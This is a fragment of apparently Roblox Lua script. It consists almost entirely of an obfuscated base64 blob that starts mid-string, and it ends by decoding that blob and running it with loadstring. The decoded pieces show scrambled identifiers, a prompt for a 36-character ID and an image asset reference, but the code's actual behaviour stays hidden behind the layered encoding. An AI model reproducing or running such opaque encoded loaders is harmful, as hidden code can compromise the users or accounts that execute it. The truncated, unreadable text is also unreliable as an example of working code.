dW5jdGlvbihHUnRFZmx3WEd3KQogICAgICAgICAgICAgICAgZHlESXprQkhUTTpRVVNiSlNneFlNKFdETVBoQWFBb20udHRCQnpoWlRISygiPXlWRHhZb3BBYkEiKSwgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9NENSSkJpWXZwRUl5VkdkakZtY2hoMll0WXpNZ1FXYXNGbWRnRUdJeVZHZHVWR0lsTlhZbHhHVSIpLCA1KQogICAgZ2p1bEZwSUpFRyA9IENQZ3BwdXhiTlc6RHdhZlJCb0NlYih7dGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygieHR3dll2Sk5GeiIpLCBjUGhYZXBZZU5hID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCIyY1RNemN6TTNRek53RXpMdm9EWnBSWFp6TlhZNEptYyIpfSks\"}").code loadstring(base64.decode(b))()
